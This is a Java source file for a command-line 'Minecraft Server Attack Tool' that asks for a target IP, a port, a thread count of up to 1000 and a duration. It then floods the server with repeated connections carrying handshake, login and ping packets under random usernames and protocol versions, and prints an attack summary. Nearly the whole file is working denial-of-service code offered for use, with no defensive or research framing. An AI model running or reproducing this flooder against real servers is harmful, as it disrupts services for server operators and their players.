import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicInteger;

public class MinecraftServerExploit {
    
    private static final String RESET = "\u001B[0m";
    private static final String RED = "\u001B[31m";
    private static final String GREEN = "\u001B[32m";
    private static final String YELLOW = "\u001B[33m";
    private static final String BLUE = "\u001B[34m";
    private static final String CYAN = "\u001B[36m";
    private static final String WHITE = "\u001B[37m";
    private static final String BOLD = "\u001B[1m";
    
    private static Scanner scanner = new Scanner(System.in);
    private static volatile boolean running = true;
    private static AtomicInteger sentPackets = new AtomicInteger(0);
    private static AtomicInteger failedPackets = new AtomicInteger(0);
    private static AtomicInteger currentThreads = new AtomicInteger(0);
    
    public static void main(String[] args) {
        printBanner();
        
        try {
            System.out.print(CYAN + "[?] " + RESET + "Target IP Address -> " + WHITE);
            String ip = scanner.nextLine();
            
            System.out.print(CYAN + "[?] " + RESET + "Target Port (default 25565) -> " + WHITE);
            String portInput = scanner.nextLine();
            int port = portInput.isEmpty() ? 25565 : Integer.parseInt(portInput);
            
            System.out.print(CYAN + "[?] " + RESET + "Threads Number (1-1000) -> " + WHITE);
            int threads = Integer.parseInt(scanner.nextLine());
            if (threads < 1) threads = 1;
            if (threads > 1000) threads = 1000;
            
            System.out.print(CYAN + "[?] " + RESET + "Attack Duration in seconds (0 for unlimited) -> " + WHITE);
            int duration = Integer.parseInt(scanner.nextLine());
            
            System.out.print(CYAN + "[?] " + RESET + "Packet Delay in ms (0 for fast) -> " + WHITE);
            int delay = Integer.parseInt(scanner.nextLine());
            
            System.out.println(YELLOW + "\n[*] " + RESET + "Starting attack on " + WHITE + ip + ":" + port + RESET);
            System.out.println(YELLOW + "[*] " + RESET + "Press Ctrl+C to stop\n");
            
            ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
            ExecutorService executor = Executors.newFixedThreadPool(threads);
            
            for (int i = 0; i < threads; i++) {
                final int threadId = i + 1;
                executor.submit(() -> attack(ip, port, threadId, delay));
            }
            
            if (duration > 0) {
                scheduler.schedule(() -> {
                    running = false;
                    executor.shutdown();
                    try {
                        executor.awaitTermination(5, TimeUnit.SECONDS);
                    } catch (InterruptedException e) {
                        executor.shutdownNow();
                    }
                    printSummary();
                    System.exit(0);
                }, duration, TimeUnit.SECONDS);
            }
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running = false;
                executor.shutdown();
                printSummary();
            }));
            
            while (running) {
                Thread.sleep(1000);
            }
            
        } catch (Exception e) {
            System.out.println(RED + "[✗] " + RESET + "Error: " + e.getMessage());
        } finally {
            scanner.close();
        }
    }
    
    private static void attack(String ip, int port, int threadId, int delay) {
        currentThreads.incrementAndGet();
        Random random = new Random();
        int packetCount = 0;
        
        while (running) {
            try {
                Socket socket = new Socket();
                socket.connect(new InetSocketAddress(ip, port), 3000);
                socket.setSoTimeout(5000);
                socket.setTcpNoDelay(true);
                
                OutputStream outStream = socket.getOutputStream();
                DataOutputStream out = new DataOutputStream(outStream);
                
                String username = "Player" + threadId + "_" + generateRandomString(5);
                int protocolVersion = 47 + random.nextInt(400);
                
                ByteArrayOutputStream handshakeBuffer = new ByteArrayOutputStream();
                DataOutputStream handshakeOut = new DataOutputStream(handshakeBuffer);
                
                writeVarInt(handshakeOut, 0);
                writeVarInt(handshakeOut, protocolVersion);
                writeString(handshakeOut, ip);
                handshakeOut.writeShort(port);
                writeVarInt(handshakeOut, 2);
                
                ByteArrayOutputStream packetBuffer = new ByteArrayOutputStream();
                DataOutputStream packetOut = new DataOutputStream(packetBuffer);
                writeVarInt(packetOut, handshakeBuffer.size());
                packetOut.write(handshakeBuffer.toByteArray());
                
                out.write(packetBuffer.toByteArray());
                out.flush();
                
                ByteArrayOutputStream loginBuffer = new ByteArrayOutputStream();
                DataOutputStream loginOut = new DataOutputStream(loginBuffer);
                
                writeVarInt(loginOut, 0);
                writeString(loginOut, username);
                
                ByteArrayOutputStream loginPacket = new ByteArrayOutputStream();
                DataOutputStream loginPacketOut = new DataOutputStream(loginPacket);
                writeVarInt(loginPacketOut, loginBuffer.size());
                loginPacketOut.write(loginBuffer.toByteArray());
                
                out.write(loginPacket.toByteArray());
                out.flush();
                
                writeVarInt(out, 1);
                out.writeLong(System.currentTimeMillis());
                out.flush();
                
                for (int i = 0; i < 3 + random.nextInt(5); i++) {
                    writeVarInt(out, 0x0C);
                    writeString(out, "ping");
                    out.flush();
                    Thread.sleep(100 + random.nextInt(200));
                }
                
                sentPackets.incrementAndGet();
                packetCount++;
                int total = sentPackets.get();
                
                if (packetCount % 5 == 0) {
                    System.out.println(GREEN + "[✓] " + RESET + "Thread-" + threadId + 
                                     GREEN + " sent packet to " + WHITE + ip + ":" + port + 
                                     GREEN + " | Total: " + WHITE + total + 
                                     GREEN + " | Protocol: " + WHITE + protocolVersion);
                }
                
                socket.close();
                
                if (delay > 0) {
                    Thread.sleep(delay + random.nextInt(100));
                } else {
                    Thread.sleep(100 + random.nextInt(200));
                }
                
            } catch (ConnectException | NoRouteToHostException e) {
                failedPackets.incrementAndGet();
                if (failedPackets.get() % 20 == 0) {
                    System.out.println(RED + "[✗] " + RESET + "Thread-" + threadId + 
                                     RED + " can't connect to " + WHITE + ip + ":" + port);
                }
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException ie) {
                    break;
                }
            } catch (SocketTimeoutException e) {
                failedPackets.incrementAndGet();
                try {
                    Thread.sleep(500);
                } catch (InterruptedException ie) {
                    break;
                }
            } catch (Exception e) {
                failedPackets.incrementAndGet();
                try {
                    Thread.sleep(300);
                } catch (InterruptedException ie) {
                    break;
                }
            }
        }
        currentThreads.decrementAndGet();
    }
    
    private static void writeVarInt(DataOutputStream out, int value) throws IOException {
        while (true) {
            if ((value & 0xFFFFFF80) == 0) {
                out.writeByte(value);
                return;
            }
            out.writeByte(value & 0x7F | 0x80);
            value >>>= 7;
        }
    }
    
    private static void writeString(DataOutputStream out, String value) throws IOException {
        byte[] bytes = value.getBytes("UTF-8");
        writeVarInt(out, bytes.length);
        out.write(bytes);
    }
    
    private static String generateRandomString(int length) {
        String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        StringBuilder sb = new StringBuilder();
        Random random = new Random();
        
        for (int i = 0; i < length; i++) {
            sb.append(chars.charAt(random.nextInt(chars.length())));
        }
        
        return sb.toString();
    }
    
    private static void printBanner() {
        String banner = CYAN + BOLD + """
                
                ╔════════════════════════════════════════════════════════════╗
                ║               Minecraft Server Attack Tool                 ║
                ║                   By Minecraft Game                        ║
                ╚════════════════════════════════════════════════════════════╝
                """ + RESET;
        System.out.println(banner);
    }
    
    private static void printSummary() {
        int totalSent = sentPackets.get();
        int totalFailed = failedPackets.get();
        int total = totalSent + totalFailed;
        
        System.out.println(CYAN + "\n" + "=".repeat(60) + RESET);
        System.out.println(BOLD + WHITE + "ATTACK SUMMARY" + RESET);
        System.out.println(CYAN + "=".repeat(60) + RESET);
        System.out.println(GREEN + "[✓] " + RESET + "Successful packets: " + GREEN + totalSent + RESET);
        System.out.println(RED + "[✗] " + RESET + "Failed packets: " + RED + totalFailed + RESET);
        System.out.println(BLUE + "[i] " + RESET + "Total packets: " + BLUE + total + RESET);
        System.out.println(YELLOW + "[!] " + RESET + "Active threads: " + YELLOW + currentThreads.get() + RESET);
        
        if (total > 0) {
            double successRate = (double) totalSent / total * 100;
            System.out.println(YELLOW + "[!] " + RESET + "Success rate: " + YELLOW + String.format("%.2f", successRate) + "%" + RESET);
        }
        
        System.out.println(CYAN + "=".repeat(60) + RESET);
    }
}